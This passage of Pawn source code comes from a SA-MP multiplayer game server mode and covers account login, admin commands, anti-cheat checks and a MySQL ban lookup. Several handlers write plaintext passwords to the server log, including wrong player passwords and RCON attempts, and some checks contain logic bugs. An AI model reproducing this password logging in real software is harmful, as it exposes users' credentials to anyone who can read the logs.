		format(string,sizeof(string),"Scores: %d | Money: $%d | Kills: %d | Deaths: %d | K/D Ratio: %0.2f", GetPlayerScore(player1), GetPlayerMoney(player1), PlayerInfo[player1][Kills], PlayerInfo[player1][Deaths], Float:PlayerInfo[player1][Kills]/Float:pDeaths);
		format(str1, sizeof(str1),"Rank: %s | Team: %s | Class: %s | Session Kills %d",GetRankName(player1), GetTeamName(player1), GetClass(player1), Skills[player1]);

		SendClientMessage(playerid, green,str);
		SendClientMessage(playerid, green,string);
		SendClientMessage(playerid, green,str1);
	} else return SendClientMessage(playerid, red, "Player Not Connected!");
	return 1;
}
#endif
//++++++++++++++++++++++++++++++++++++++++ DINI  DUMP________________________________

/*

CMD:register(playerid,params[])
{
    if (PlayerInfo[playerid][LoggedIn] == 1) return SendClientMessage(playerid,red,"ACCOUNT: You are already registered and logged in.");
    if (udb_Exists(PlayerName2(playerid))) return SendClientMessage(playerid,red,"ACCOUNT: This account already exists, please use '/login [password]'.");
    if (strlen(params) == 0) return SendClientMessage(playerid,red,"ACCOUNT: Correct JikyBot: Usage:'/register [password]'");
    if (strlen(params) < 4 || strlen(params) > 20) return SendClientMessage(playerid,red,"ACCOUNT: Password length must be greater than three characters");
    if (udb_Create(PlayerName2(playerid),params))
	{
    	new file[256],name[MAX_PLAYER_NAME], tmp3[100];
    	new strdate[20], year,month,day;	getdate(year, month, day);
		GetPlayerName(playerid,name,sizeof(name)); format(file,sizeof(file),"/ladmin/users/%s.sav",udb_encode(name));
     	GetPlayerIp(playerid,tmp3,100);	dini_Set(file,"ip",tmp3);
//    	dini_Set(file,"password",params);
	    dUserSetINT(PlayerName2(playerid)).("registered",1);
   		format(strdate, sizeof(strdate), "%d/%d/%d",day,month,year);
		dini_Set(file,"RegisteredDate",strdate);
		dUserSetINT(PlayerName2(playerid)).("loggedin",1);
		dUserSetINT(PlayerName2(playerid)).("banned",0);
		dUserSetINT(PlayerName2(playerid)).("level",0);
	    dUserSetINT(PlayerName2(playerid)).("LastOn",0);
    	dUserSetINT(PlayerName2(playerid)).("money",0);
    	dUserSetINT(PlayerName2(playerid)).("Score",0);
    	dUserSetINT(PlayerName2(playerid)).("kills",0);
	   	dUserSetINT(PlayerName2(playerid)).("deaths",0);
	   	dUserSetINT(PlayerName2(playerid)).("hours",0);
	   	dUserSetINT(PlayerName2(playerid)).("minutes",0);
	   	dUserSetINT(PlayerName2(playerid)).("seconds",0);
	   	dUserSetINT(PlayerName2(playerid)).("drank",0);
	    PlayerInfo[playerid][LoggedIn] = 1;
	    PlayerInfo[playerid][Registered] = 1;
	    SendClientMessage(playerid, green, "ACCOUNT: You are now registered, and have been automaticaly logged in");
		PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		return 1;
	}
    return 1;
}

CMD:login(playerid,params[])
{
    if (PlayerInfo[playerid][LoggedIn] == 1) return SendClientMessage(playerid,red,"ACCOUNT: You are already logged in.");
    if (!udb_Exists(PlayerName2(playerid))) return SendClientMessage(playerid,red,"ACCOUNT: Account doesn't exist, please use '/register [password]'.");
    if (strlen(params)==0) return SendClientMessage(playerid,red,"ACCOUNT: Correct JikyBot: Usage:'/login [password]'");
    if (udb_CheckLogin(PlayerName2(playerid),params))
	{
		new file[256], tmp3[100], string[128];
	   	format(file,sizeof(file),"/ladmin/users/%s.sav",udb_encode(PlayerName2(playerid)) );
   		GetPlayerIp(playerid,tmp3,100);
	   	dini_Set(file,"ip",tmp3);
		LoginPlayer(playerid);
		PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		if(PlayerInfo[playerid][Level] > 0) {
			format(string,sizeof(string),"ACCOUNT: Successfully Logged In. (Level %d)", PlayerInfo[playerid][Level] );
			return SendClientMessage(playerid,green,string);
       	} else return SendClientMessage(playerid,green,"ACCOUNT: Successfully Logged In");
	}
	else {
		PlayerInfo[playerid][FailLogin]++;
		printf("LOGIN: %s has failed to login, Wrong password (%s) Attempt (%d)", PlayerName2(playerid), params, PlayerInfo[playerid][FailLogin] );
		if(PlayerInfo[playerid][FailLogin] == MAX_FAIL_LOGINS)
		{
			new string[128]; format(string, sizeof(string), "%s has been kicked (Failed Logins)", PlayerName2(playerid) );
			SendClientMessageToAll(grey, string);
			print(string);
			Kick(playerid);
		}
		return SendClientMessage(playerid,red,"ACCOUNT: Login failed! Incorrect Password");
	}
}

*/
//++++++++++++++++++++++++++++++++++++++++++++++DINIDUMP********************************
CMD:login(playerid,params[])
{
    if(!Logged[playerid]) //If the player isn't logged in and (s)he tries to spawn.
    {
        if(!IsRegistered[playerid])  //If the player isn't registered
        {
            ShowPlayerDialog(playerid, 15000, DIALOG_STYLE_INPUT, "Register","Your user is {FF0000}not{FFFFFF} registered! Please {0000FF}register{FFFFFF} with a password below!\n {FF0000}ERROR:You must register before spawning!","Register","Cancel"); //Shows our register dialog :).
            return 0; //Prevents the player from spawning
        }
        if(IsRegistered[playerid] == 1) //Our handy variable comes into use now
        {
            ShowPlayerDialog(playerid, 15500, DIALOG_STYLE_INPUT, "Login","Your user is {FF0000}registered{FFFFFF}! Please {0000FF}login{FFFFFF} with your password below!\n{FF0000} You must login before you spawn!","Login","Cancel"); //Shows our login dialog :).
            return 0; //Prevents the player from spawning
        }
    }
	else SendClientMessage(playerid, 0xFFCC66, "You Are Already Logged IN!!! Use /register or /login");
    return 1;

}

CMD:changepass(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1)	{
		SendClientMessage(playerid,red, "JikyBot: You must go to http://xenon-extreme.com/usercp/   To change your Password");
		return SendClientMessage(playerid,yellow,"Login With Your Ingame Details There And Select Change Password");
	} else return SendClientMessage(playerid,red, "JikyBot: You must have an account to use this command");
}

CMD:setname(playerid, params[])
{
        if(PlayerInfo[playerid][Level] >= 5)	{
        new string[128], tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
		if(isnull(tmp) || isnull(tmp2)) return SendClientMessage(playerid, red, "JikyBot: Usage:/setname [playerid] [new name]");
		if (udb_Exists(tmp2)) return SendClientMessage(playerid,red,"This User Name Is Taken!");
		new player1 = strval(tmp);
		if(Logged[player1] == 0) return SendClientMessage(playerid,red,"Player Must Have Account!");
		new OldName[24],str[128];
		GetPlayerName(player1,OldName,sizeof(OldName));
		format(str,sizeof(str),"ladmin/users/%s.sav",OldName);
		udb_RenameUser(OldName,tmp2);
		format(str,sizeof(str),"ladmin/users/%s.sav",params);
		SetPlayerName(player1,tmp2);
		PlayerPlaySound(player1,1057,0.0,0.0,0.0);
        format(string, sizeof(string),"Admin ''%s'' Has Changed Your Name To '%s'",PlayerName2(playerid), tmp2);
		return SendClientMessage(player1,yellow,string);
	}   else return SendClientMessage(playerid,red, "JikyBot: Only Level +5 can Use This Command");
}
/*
CMD:changename(playerid, params[])
{
        if(PlayerInfo[playerid][LoggedIn] == 1)	{
		if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/changename [new Name]");
		if(strlen(params) < 4) return SendClientMessage(playerid,red,"ACCOUNT: Incorrect nick length");
		if (udb_Exists(params)) return SendClientMessage(playerid,red,"This User Name Is Taken!");
		if(GetPlayerMoney(playerid) < 500000) return SendClientMessage(playerid, red,"You need to have $500000 to change name. Contact any Admins online for free nick change");
		new nameee[24];  GetPlayerName(playerid, nameee, 16);
		new OldName[24],str[128];
		GetPlayerName(playerid,OldName,sizeof(OldName));
		format(str,sizeof(str),"ladmin/users/%s.sav",OldName);
		udb_RenameUser(OldName,params);
		format(str,sizeof(str),"ladmin/users/%s.sav",params);
		SetPlayerName(playerid,params);
		PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		new string[128];
		GivePlayerMoney(playerid, -500000);
        format(string, sizeof(string),"ACCOUNT: You have successfully changed your Name to \"%s\"",params);
		return SendClientMessage(playerid,yellow,string);
	} else return SendClientMessage(playerid,red, "JikyBot: You must have an account to use this command");
}
*/
CMD:setpass(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 5) {
	    new string[128], tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2)) return SendClientMessage(playerid, red, "JikyBot: Usage:/setpass [playername] [new password]");
		if(strlen(tmp2) < 4 || strlen(tmp2) > MAX_PLAYER_NAME) return SendClientMessage(playerid,red,"JikyBot: Incorrect password length");
		if(udb_Exists(tmp)) {
			dUserSetINT(tmp).("password_hash", udb_hash(tmp2));
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
    	    format(string, sizeof(string),"ACCOUNT: You have successfully set \"%s's\" account password to \"%s\"", tmp, tmp2);
			return SendClientMessage(playerid,yellow,string);
		} else return SendClientMessage(playerid,red, "JikyBot: This player doesnt have an account");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}


#if defined USE_STATS
CMD:resetstats(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][LoggedIn] == 1)	{
		// save as backup
	   	dUserSetINT(PlayerName2(playerid)).("oldkills",PlayerInfo[playerid][Kills]);
	   	dUserSetINT(PlayerName2(playerid)).("olddeaths",PlayerInfo[playerid][Deaths]);
		// stats reset
		PlayerInfo[playerid][Kills] = 0;
		PlayerInfo[playerid][Deaths] = 0;
		dUserSetINT(PlayerName2(playerid)).("kills",PlayerInfo[playerid][Kills]);
	   	dUserSetINT(PlayerName2(playerid)).("deaths",PlayerInfo[playerid][Deaths]);
        PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		return SendClientMessage(playerid,yellow,"ACCOUNT: You have successfully reset your stats. Your kills and deaths are: 0");
	} else return SendClientMessage(playerid,red, "JikyBot: You must have an account to use this command");
}
#endif


#endif

stock LoginPlayer(playerid)
{
	dUserSetINT(PlayerName2(playerid)).("loggedin",1);
	PlayerInfo[playerid][Deaths] = (dUserINT(PlayerName2(playerid)).("deaths"));
	PlayerInfo[playerid][Kills] = (dUserINT(PlayerName2(playerid)).("kills"));
 	PlayerInfo[playerid][Level] = (dUserINT(PlayerName2(playerid)).("level"));
   	PlayerInfo[playerid][hours] = dUserINT(PlayerName2(playerid)).("hours");
   	PlayerInfo[playerid][mins] = dUserINT(PlayerName2(playerid)).("minutes");
   	PlayerInfo[playerid][secs] = dUserINT(PlayerName2(playerid)).("seconds");
   	SetPlayerScore(playerid,dUserINT(PlayerName2(playerid)).("Score"));
   	SetPlayerMoney(playerid,dUserINT(PlayerName2(playerid)).("money"));
   	PlayerInfo[playerid][Helper] = (dUserINT(PlayerName2(playerid)).("Help Operator"));
   	PlayerInfo[playerid][dRank] = (dUserINT(PlayerName2(playerid)).("Donor"));
	PlayerInfo[playerid][Registered] = 1;
 	PlayerInfo[playerid][LoggedIn] = 1;
 	return 1;
}

//==============================================================================
public OnRconLoginAttempt(ip[], password[], success)
{
    new playerid = GetPlayerIDbyIP(ip);
	if (!success)
	{
	    printf("[RconPro] Bad RCON login attempt by %s (Player %d), PW: %s", ip, playerid, password);
	} else {
	    new fail = USE_NAME_WHITELIST || USE_IP_WHITELIST;

	    #if (USE_NAME_WHITELIST == true)
			if(playerid != -1) {
				new name[MAX_PLAYER_NAME];
		        GetPlayerName(playerid, name, MAX_PLAYER_NAME);
				for (new i = 0; i < sizeof(namewhitelist); i++)
				{
				    if(!strcmp(name, namewhitelist[i], false)) fail = false;
				}
			}
		#endif

		#if (USE_IP_WHITELIST == true)
			for (new i = 0; i < sizeof(ipwhitelist); i++)
			{
			    if(!strcmp(ip, ipwhitelist[i], false)) fail = false;
			}
		#endif

	    if(!fail)
		{
			printf("[RconPro] Succesful RCON login by %s (Player %d), PW: %s", ip, playerid, password);
		} else
		{
		    if(playerid != -1)
			{
				SendClientMessage(playerid, 0xFFFFFFFF, "You are not allowed to login as RCON admin.");
			    printf("[RconPro] Succesful RCON login attempt by %s (Player %d), PW: %s BLOCKED BY WHITELIST", ip, playerid, password);
		        Kick(playerid);
		    }
		}
	}
	return 1;
}

//++++++++++++++++++++++++++++++++++++++Anti Speed hack by abhay
public OnPlayerUpdate(playerid)
{
        //Anti SpeedHack
    if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
    {
    	if(GetPlayerVehicleID(playerid) != 578 || GetPlayerVehicleID(playerid) != 520 || GetPlayerVehicleID(playerid) != 578 || 425)
      	{
           if(PlayerInfo[playerid][Level] < 9)
           {
         		if(GetVehicleSpeed(GetPlayerVehicleID(playerid), 0) > 250)
          		{
                    new Float:x, Float:y, Float:z;
                    GetPlayerPos(playerid, x, y, z);
//                    SetPlayerPos(playerid, x, y, z+5);
                    SpeedHacking[playerid] =1;
                    CheatsDetected(playerid);
            		return 1;
         		}
   			}
     	}
    }
    //OTHER CODES
    /////////////////////////FLY HACK////////////////////////////////////////
    new Float:animX, Float:animY, Float:animZ;
    new anim = GetPlayerAnimationIndex(playerid);
    GetPlayerPos(playerid, animX, animY, animZ);
    if((anim >= 1538) && (anim <= 1542) && animZ > 5)
    {

		TogglePlayerControllable(playerid, false);
        SetPlayerPos(playerid, 1941.1534,-1100.2391,-23.7885);
//        ShowPlayerDialog(playerid, DIALOG_PRAVILA,DIALOG_STYLE_MSGBOX,"Anti-Hack", "{FFCC00}[Anticheat]"WHITE"[Anti-Cheat] You Have Been Banned for using Fly Hack!!!","Ok","");
        CMDMessageToAdminsHack(playerid, "Fly Hack");
	}
	
///////////////////////ARMOUR HACK/////////////////////////////////////
	new Float:Armour;
 	GetPlayerArmour(playerid, Armour);
 	#if defined MAX_ARMOUR
 	if(Armour > 200.0)
    {
        TogglePlayerControllable(playerid, false);
        SetPlayerPos(playerid, 1941.1534,-1100.2391,-23.7885);
//        ShowPlayerDialog(playerid, DIALOG_PRAVILA,DIALOG_STYLE_MSGBOX,"Anti-Hack", "{FFCC00}[Anticheat]"WHITE"[Anti-Cheat] You Have Been Banned for using Armour hack!!!","Ok","");
//        CMDMessageToAdminsHack(playerid, "Armour Hack");
    }
    ///////////////JETPACK HACK//////////////////////////////////////////////
    if(GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_USEJETPACK)
    {
        if(JetPack[playerid] == 0)
        {
//           ShowPlayerDialog(playerid, DIALOG_PRAVILA,DIALOG_STYLE_MSGBOX,"Anti-Hack", "{FFCC00}[Anticheat]"WHITE"[Anti-Cheat] You Have Been Banned for using Jetpack Hack!!!","Ok","");
			if(PlayerInfo[playerid][OnDuty] != 1 && PlayerInfo[playerid][Level] <= 8 && gClass[playerid] != JET)
           	CMDMessageToAdminsHack(playerid, "Jetpack Hack");
        }
        else
            return 1;
    }
    else JetPack[playerid] = 0;
    
    return 1;
}
stock CheatsDetected(playerid)
{
   new string[128];
   if(SpeedHacking[playerid] == 1)
   {
      new pName1[MAX_PLAYER_NAME];
      GetPlayerName(playerid,pName1,MAX_PLAYER_NAME);
      format(string,sizeof(string),"Warning: %s(%d). For Speed Hacks",pName1,playerid);
      MessageToAdmins(red,string);
      return 1;
  }
 return 1;
}
stock GetVehicleSpeed(vehicleid, get3d)
{
        new Float:x, Float:y, Float:z;
        GetVehicleVelocity(vehicleid, x, y, z);
        return SpeedCheck(x, y, z, 100.0, get3d);
}
//Map Teleport

public OnPlayerClickMap(playerid, Float:fX, Float:fY, Float:fZ)
{
	if(PlayerInfo[playerid][OnDuty] >= 1|| IsPlayerAdmin(playerid) || PlayerInfo[playerid][Level] >= 8)
	{
    	SetPlayerPosFindZ(playerid, fX, fY, fZ);
    	CMDMessageToAdmins(playerid,"MAPTP");
    }
    return 1;
}


//+++++++++++++++++++++++++++++++++Anti crash By abhay
public OnPlayerWeaponShot(playerid, weaponid, hittype, hitid, Float:fX, Float:fY, Float:fZ)
{
   if( hittype != BULLET_HIT_TYPE_NONE ) // Bullet Crashing uses just this hittype
	{
        if( !( -1000.0 <= fX <= 1000.0 ) || !( -1000.0 <= fY <= 1000.0 ) || !( -1000.0 <= fZ <= 1000.0 ) ) // a valid offset, it's impossible that a offset bigger than 1000 is legit (also less than -1000.0 is impossible, not used by this hack, but still, let's check for it, just for the future, who knows what hacks will appear). The object with biggest offset is having ~700-800 radius.
		{       if(enablecrash==1)
		        {
			    Kick(playerid);
				MessageToAdmins(red,"A Crasher Kicked");
				}

			return 0; // let's desynchronize that bullet, so players won't crash
		}
	}

    new rkickmes[128];
	new pname[24];
	GetPlayerName(playerid, pname, 24);
	if(weaponid != 38)
 	{
                if((gettime() - shotTime[playerid]) < 1)
                {
                    shot[playerid]+=1;
                }
                else
                {
                    shot[playerid]=0;
                }
                if(shot[playerid] > 20)
                {
                        format(rkickmes, sizeof(rkickmes), "Warning: %s (%d) for Rapid fire hacks",pname,playerid);
//						SendClientMessageToAll(0xC93CCE00,rkickmes);
                        if(enablearf==1)
                        {
						MessageToAdmins(red,rkickmes);
						}
//						SendClientMessage(playerid, 0xFF0000FF, "You have been kicked by admin Dumbledore, for rapid fire hacks!");
//	    				SetTimerEx("DelayedKick", 1000, false, "i", playerid);
//                        Kick(playerid);
                }
                shotTime[playerid] = gettime();
    }

  return 1;
}
stock BadFloat(Float:x)
{
    if(x >= 10.0 || x <= -10.0)return true;
     return false;
}
//==============================================================================
public OnPlayerCommandReceived(playerid, cmdtext[])
{
    if(PlayerInfo[playerid][Jailed] == 1 && PlayerInfo[playerid][Level] < 1) return
	    SendClientMessage(playerid,red,"You cannot use commands in jail");
	if(PlayerInfo[playerid][Level] < 1)
	{
	    new TCount, KMessage[128];

		TCount = GetPVarInt(playerid, "CommandSpamCount");

		TCount++;

		SetPVarInt(playerid, "CommandSpamCount", TCount);
		if(TCount == 3)
		{
			GetPlayerName(playerid, KMessage, sizeof(KMessage));
			format(KMessage, sizeof(KMessage), "[Anti-Spam]: %s has been kicked for command spamming.", KMessage);
			SendClientMessageToAll(0xFFFFFFFF, KMessage);
			print(KMessage);
			Kick(playerid);
		}

		SetTimerEx("ResetCommandCount", SpamLimit, false, "i", playerid);
    }

	new cmd[256], string[128], tmp[256], idx;
	cmd = strtok(cmdtext, idx);
	if(ServerInfo[ReadCmds] == 1)
	{
		format(string, sizeof(string), "*%s (%d) COMMAND: %s", pName(playerid),playerid,cmdtext);
		foreach(Player, i) {
			if(IsPlayerConnected(i)) {
				if( (PlayerInfo[i][Level] > PlayerInfo[playerid][Level]) && (PlayerInfo[i][Level] > 6) && (i != playerid) ) {
					SendClientMessage(i, grey, string);
				}
			}
		}
	}


//========================= [ Car Commands ]====================================
//------------------------------------------------------------------------------
	if(strcmp(cmd, "/lp", true) == 0)	{
	if(PlayerInfo[playerid][OnDuty] >= 1) {
		if (GetPlayerState(playerid) == 2)
		{
		new VehicleID = GetPlayerVehicleID(playerid), LModel = GetVehicleModel(VehicleID);
        switch(LModel) { case 448,461,462,463,468,471,509,510,521,522,523,581,586, 449: return SendClientMessage(playerid,red,"JikyBot: You can not tune this vehicle"); }
		new str[128], Float:pos[3];	format(str, sizeof(str), "%s", cmdtext[2]);
		SetVehicleNumberPlate(VehicleID, str);
		GetPlayerPos(playerid, pos[0], pos[1], pos[2]);	SetPlayerPos(playerid, pos[0]+1, pos[1], pos[2]);
		SetVehicleToRespawn(VehicleID); SetVehiclePos(VehicleID, pos[0], pos[1], pos[2]);
		TuneLCar(playerid);    PlayerPlaySound(playerid,1133,0.0,0.0,0.0);
		SendClientMessage(playerid, blue, "You have changed your licence plate");   CMDMessageToAdmins(playerid,"LP");
		} else {
		SendClientMessage(playerid,red,"JikyBot: You have to be the driver of a vehicle to change its licence plate");	}
	} else	{
  	SendClientMessage(playerid,red,"JikyBot: You need to be on adminduty to use this command");   }
	return 1;	}

//------------------------------------------------------------------------------
//------------------------------------------------------------------------------
 	if(strcmp(cmd, "/write", true) == 0) {
	if(PlayerInfo[playerid][Level] >= 4) {
	    tmp = strtok(cmdtext, idx);
		if(isnull(tmp)) {
			SendClientMessage(playerid, red, "JikyBot: Usage:/write [Colour] [Text]");
			return SendClientMessage(playerid, red, "Colours: 0=black 1=white 2=red 3=orange 4=yellow 5=green 6=blue 7=purple 8=brown 9=pink");
	 	}
		new Colour;
		Colour = strval(tmp);
		if(Colour > 9 )	{
			SendClientMessage(playerid, red, "JikyBot: Usage:/write [Colour] [Text]");
			return SendClientMessage(playerid, red, "Colours: 0=black 1=white 2=red 3=orange 4=yellow 5=green 6=blue 7=purple 8=brown 9=pink");
		}
		tmp = strtok(cmdtext, idx);

        CMDMessageToAdmins(playerid,"WRITE");

        if(Colour == 0) {	format(string,sizeof(string),"%s",cmdtext[9]);	SendClientMessageToAll(black,string); return 1;	}
        else if(Colour == 1) {	format(string,sizeof(string),"%s",cmdtext[9]);	SendClientMessageToAll(COLOR_WHITE,string); return 1;	}
        else if(Colour == 2) {	format(string,sizeof(string),"%s",cmdtext[9]);	SendClientMessageToAll(red,string); return 1;	}
        else if(Colour == 3) {	format(string,sizeof(string),"%s",cmdtext[9]);	SendClientMessageToAll(orange,string); return 1;	}
        else if(Colour == 4) {	format(string,sizeof(string),"%s",cmdtext[9]);	SendClientMessageToAll(yellow,string); return 1;	}
        else if(Colour == 5) {	format(string,sizeof(string),"%s",cmdtext[9]);	SendClientMessageToAll(COLOR_GREEN1,string); return 1;	}
        else if(Colour == 6) {	format(string,sizeof(string),"%s",cmdtext[9]);	SendClientMessageToAll(COLOR_BLUE,string); return 1;	}
        else if(Colour == 7) {	format(string,sizeof(string),"%s",cmdtext[9]);	SendClientMessageToAll(COLOR_PURPLE,string); return 1;	}
        else if(Colour == 8) {	format(string,sizeof(string),"%s",cmdtext[9]);	SendClientMessageToAll(COLOR_BROWN,string); return 1;	}
        else if(Colour == 9) {	format(string,sizeof(string),"%s",cmdtext[9]);	SendClientMessageToAll(COLOR_PINK,string); return 1;	}
	    } else return SendClientMessage(playerid,red,"JikyBot: You need to be level 1 to use this command");
        return 1;
        }


	return 1;
}

forward ResetCount(playerid);
public ResetCount(playerid)
{
	SetPVarInt(playerid, "TextSpamCount", 0);
}
forward ResetCommandCount(playerid);
public ResetCommandCount(playerid)
{
	SetPVarInt(playerid, "CommandSpamCount", 0);
}

//==============================================================================
#if defined ENABLE_SPEC

public OnPlayerInteriorChange(playerid, newinteriorid, oldinteriorid)
{
	new x = 0;
	while(x!=MAX_PLAYERS) {
	    if( IsPlayerConnected(x) &&	GetPlayerState(x) == PLAYER_STATE_SPECTATING &&
			PlayerInfo[x][SpecID] == playerid && PlayerInfo[x][SpecType] == ADMIN_SPEC_TYPE_PLAYER )
   		{
   		    SetPlayerInterior(x,newinteriorid);
		}
		x++;
	}
}


//==============================================================================

//==============================================================================
public OnPlayerEnterVehicle(playerid, vehicleid) {
	for(new x=0; x<MAX_PLAYERS; x++) {
	    if(GetPlayerState(x) == PLAYER_STATE_SPECTATING && PlayerInfo[x][SpecID] == playerid) {
	        TogglePlayerSpectating(x, 1);
	        PlayerSpectateVehicle(x, vehicleid);
	        PlayerInfo[x][SpecType] = ADMIN_SPEC_TYPE_VEHICLE;
		}
	}
	if(IsBomberPatriot(vehicleid))
   	{
      SendClientMessage(playerid, COLOR_LIME, "Press Y to create explosions using SUPER PATRIOT");
   	}
    VID[playerid] = vehicleid;
    SetPlayerArmedWeapon(playerid, 0);
	return 1;
}

//==============================================================================
public OnPlayerStateChange(playerid, newstate, oldstate) {
	switch(newstate) {
		case PLAYER_STATE_ONFOOT: {
			switch(oldstate) {
				case PLAYER_STATE_DRIVER: OnPlayerExitVehicle(playerid,255);
				case PLAYER_STATE_PASSENGER: OnPlayerExitVehicle(playerid,255);
			}
		}
	}
/*
 	new vehicleidk;
    if(newstate == PLAYER_STATE_DRIVER)
    {
        vehicleidk = GetPlayerVehicleID(playerid);
        if(vehicleidk == A69Prot)
        {
            if(GetPVarInt(playerid,"StealingTime")>GetTickCount())
			{
			SendClientMessage(playerid,0xFF0000FF,"Please wait before stealing the Area69 Prototype again.");
			RemovePlayerFromVehicle(playerid);
			return 1;
   			}
   			SetPlayerCheckpoint(playerid, -318.6541,1060.9193,19.7422, 20.0);
   			SetPlayerMapIcon(playerid,1, -318.6541,1060.9193,19.7422, 41, 0, MAPICON_GLOBAL);
            GameTextForPlayer(playerid, "~w~You are stealing the ~r~Area69 Prototype! Take it back to the ~r~red ~w~checkpoint! (Follow waypoint icon)", 5000, 3);
            SendClientMessage(playerid,0xAA3333AA,"** Don't exit the prototype UNTIL YOU TOOK IT BACK TO THE CHECKPOINT! (Follow waypoint icon!)");
            SendClientMessage(playerid,0xAA3333AA,"** Enemies will try to kill you so watch yourself!");
            StealingA69Prot[playerid] = 1;
            SetPVarInt(playerid,"StealingTime",GetTickCount()+600000);
			new pname[24];
            GetPlayerName(playerid, pname, 24);
            new kk[140];
            new okk[128];
            format(kk, sizeof(kk), "** %s (%d) is stealing the Area69 Prototype, stop him now at all costs!",pname,playerid);
            format(okk, sizeof(okk), "** You can find him by using /loc %s or /loc %d.",pname,playerid);
            SendClientMessageToAll(0xC93CCE00,kk);
			SendClientMessageToAll(0xC93CCE00,okk);
        }
   	}*/
   	
	if(oldstate == PLAYER_STATE_DRIVER && newstate == PLAYER_STATE_ONFOOT){
        if(grider[playerid][0]){
	    	DestroyObject(grider[playerid][0]);
	    	DestroyObject(grider[playerid][1]);
	    	DestroyObject(grider[playerid][2]);
	    	grider[playerid][0] = 0;
		}
    }
	if(oldstate == PLAYER_STATE_DRIVER && newstate == PLAYER_STATE_WASTED){
        if(grider[playerid][0]){
	    	DestroyObject(grider[playerid][0]);
	    	DestroyObject(grider[playerid][1]);
	    	DestroyObject(grider[playerid][2]);
	    	grider[playerid][0] = 0;
		}
    }
   	if(newstate == PLAYER_STATE_DRIVER)
    {
        PlayerEnterTime[playerid] = GetTickCount();
        SetPlayerArmedWeapon(playerid, 0);
    }
    else if(oldstate == PLAYER_STATE_DRIVER)
    {
        if((GetTickCount()-PlayerEnterTime[playerid]) < 220)//player entered and exited vehicle faster than 220 ms.
        {
 			new rkickmes[128];
			new pname[24];
			GetPlayerName(playerid, pname, 24);
			if(enablecar==1)
   			{
				MessageToAdmins(red,rkickmes);
			}
        }
    }
	
	
	return 1;
}

#endif


//==============================================================================
public OnPlayerExitVehicle(playerid, vehicleid)
{
/*    if(StealingA69Prot[playerid] == 1)
    {
    	RemovePlayerMapIcon(playerid,1);
    	SendClientMessage(playerid, 0x00BFFFAA, "You left the Area69 Prototype and the mission is failed!");
    	GivePlayerMoney(playerid, -500);
    	StealingA69Prot[playerid] = 0;
    	new pname[24];
    	GetPlayerName(playerid, pname, 24);
    	new kk[128];
    	format(kk, sizeof(kk), "** %s (%d) failed stealing Area69 Prototype!",pname,playerid);
		SendClientMessageToAll(0xC93CCE00,kk);
		SetPVarInt(playerid,"StealingTime",GetTickCount()+600000);
    }*/
	if(PlayerInfo[playerid][DoorsLocked] == 1) SetVehicleParamsForPlayer(GetPlayerVehicleID(playerid),playerid,false,false);

	#if defined ENABLE_SPEC
	for(new x=0; x<MAX_PLAYERS; x++) {
    	if(GetPlayerState(x) == PLAYER_STATE_SPECTATING && PlayerInfo[x][SpecID] == playerid && PlayerInfo[x][SpecType] == ADMIN_SPEC_TYPE_VEHICLE) {
        	TogglePlayerSpectating(x, 1);
	        PlayerSpectatePlayer(x, playerid);
    	    PlayerInfo[x][SpecType] = ADMIN_SPEC_TYPE_PLAYER;
		}
	}
	#endif
	return 1;
}
//+++++++++++++++++++++++++New Ban system++++++++++++++++++++++++++++++++
forward DelayedKick(playerid);
public DelayedKick(playerid)
{
    Kick(playerid);
    return 1;
}
// +++++++++++++++++++++++++++++My Sql Ban sys By abhay++++++++++++++++++++++
//======================Ban system Stocks=====================================
stock escpname(playerid)
{
    new escname[24], Pname[24];
    GetPlayerName(playerid, Pname, 24);
    mysql_real_escape_string(Pname, escname);
    return escname;
}
stock PlayerName5(playerid)
{
  new name[MAX_PLAYER_NAME];
  GetPlayerName(playerid, name, MAX_PLAYER_NAME);
  return name;
}
stock MySQL_BanCheck(playerid)
{
  new query[200], admin[50], pname[50], IP[16], string1[100];
  GetPlayerIp(playerid, IP, 16);
  format(query, sizeof(query),"SELECT * FROM `bandata` WHERE(`player`='%s') AND `banned`=1 LIMIT 1", escpname(playerid), IP);
  mysql_query(query);
  mysql_query(query);
  mysql_store_result();
  if(mysql_num_rows() != 0)
  {
     while(mysql_fetch_row(query))
     {
       mysql_fetch_field_row(admin, "admin");
       mysql_fetch_field_row(pname, "player");
       mysql_fetch_field_row(string1, "reason");
     }
     new string[128];
     new str[50], str1[100];
     format(string, sizeof(string),"Admin: %s", admin);
     format(str, sizeof(str),"Player: %s", pname);
     format(str1, sizeof(str1),"Reason: %s", string1);
     SendClientMessage(playerid, red,"You are banned from this server!");
     SendClientMessage(playerid, red,"___________________");
     SendClientMessage(playerid, red, str);
     SendClientMessage(playerid, red, string);
     SendClientMessage(playerid, red, str1);
     SendClientMessage(playerid, red,"___________________");
     SendClientMessage(playerid, red, "If you think that this BAN was a mistake, then post a screenshot(using F8) on our website");
     SendClientMessage(playerid, red, "The current nick name has been banned you may join with a new name");
	 SendClientMessage(playerid, red, "You have been banned from the server please make a unban application at our forum");
	 SendClientMessage(playerid, red, "Forum  xenon-extreme.com");
     SetTimerEx("DelayedKick", 400, false, "i", playerid);
  }
  mysql_free_result();
  return 1;
}

stock MySQL_BanCheck1(playerid)
{
  new query[200], admin[50], pname[50], IP[16], string1[100];
  GetPlayerIp(playerid, IP, 16);
  format(query, sizeof(query),"SELECT * FROM `rangeban` WHERE(`player`='%s' OR `IP`='%s') AND `banned`=1 LIMIT 1", escpname(playerid), IP);
  mysql_query(query);
  mysql_store_result();
  if(mysql_num_rows() != 0)
  {
     while(mysql_fetch_row(query))
     {
       mysql_fetch_field_row(admin, "admin");
       mysql_fetch_field_row(pname, "player");
       mysql_fetch_field_row(string1, "reason");
